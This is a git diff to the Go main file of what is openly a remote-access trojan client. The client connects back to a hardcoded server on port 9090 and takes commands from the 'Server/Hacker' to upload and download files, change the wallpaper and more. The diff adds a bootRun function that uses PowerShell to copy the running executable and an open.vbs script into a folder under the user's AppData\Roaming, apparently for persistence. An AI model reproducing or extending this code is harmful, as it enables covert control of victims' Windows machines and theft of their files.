@@ -17,6 +17,9 @@ import (
 	"bufio"
 	"fmt"
 	"log"
+	"os"
+	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -28,7 +31,7 @@ func DisplayError(err error) {
 }
 func main() {
 
-	ServerIP := "192.168.0.201"
+	ServerIP := "192.168.0.202"
 	Port := "9090"
 	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
 	if err != nil {
@@ -37,6 +40,8 @@ func main() {
 	defer connection.Close()
 	fmt.Print("\033[H\033[2J")
 	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())
+
+	bootRun()
 
 	reader := bufio.NewReader(connection)
 
@@ -65,7 +70,7 @@ func main() {
 			DisplayError(err)
 
 		case user_input == "upload":
-			fmt.Println("[+] Downloading File From Server/HAcker")
+			fmt.Println("[+] Downloading File From Server/Hacker")
 			err = Download.ReadFileContents(connection)
 			DisplayError(err)
 
@@ -85,7 +90,7 @@ func main() {
 			DisplayError(err)
 
 		case user_input == "wallpaper":
-			fmt.Println("[+] Waiting for irl")
+			fmt.Println("[+] Waiting for URL")
 			err = wall.Url(connection)
 			DisplayError(err)
 
@@ -132,4 +137,35 @@ func main() {
 			fmt.Println("[-] Invalid command")
 		}
 	}
+}
+
+func bootRun() {
+	home, _ := os.UserHomeDir()
+	exe_name := filepath.Base(os.Args[0])
+	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
+	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
+
+	c1 := os.Chdir(filepath.Join(home, "AppData\\Roaming"))
+	if c1 != nil {
+		panic(c1)
+	}
+
+	if _, err := os.Stat(filepath.Join(home, "AppData\\Roaming", without_ext)); os.IsNotExist(err) {
+
+		e := os.Mkdir(without_ext, 0755)
+		if e != nil {
+			panic(e)
+		}
+	}
+
+	c2 := exec.Command("powershell", "Copy-Item", "./"+os.Args[0]+",./open.vbs", "-Destination", appdata)
+	if err := c2.Run(); err != nil {
+		fmt.Println("Error: ", err)
+	}
+
+	c3 := os.Chdir(filepath.Join(home, "AppData\\Roaming", without_ext))
+	if c3 != nil {
+		panic(c3)
+	}
+	return
 }
